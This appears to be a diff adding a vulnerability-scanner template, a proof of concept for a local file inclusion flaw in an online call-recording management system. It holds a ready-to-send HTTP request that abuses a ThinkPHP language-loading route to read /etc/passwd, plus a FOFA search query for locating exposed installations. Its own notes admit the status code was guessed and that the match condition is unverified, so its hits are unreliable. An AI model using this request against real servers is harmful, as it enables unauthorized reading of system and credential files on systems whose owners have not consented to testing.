@@ -1,0 +1,33 @@
+id: poc-7d0c32ba903bc0123955
+info:
+  name: 申瓯通信设备有限公司在线录音管理系统index存在文件包含漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/7d0c32ba903bc012395565b9aedd3727
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: lfi,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 7d0c32ba903bc012395565b9aedd3727
+    fofa: + fofa`title="在线录音管理系统"`
+http:
+- raw:
+  - 'GET /callcenter/public/index.php?s=index/\think\Lang/load&file=/etc/passwd HTTP/1.1
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36
+
+    Cache-Control: no-cache
+
+    Pragma: no-cache
+
+    Host: {{Hostname}}
+
+    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+
+    Connection: close'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
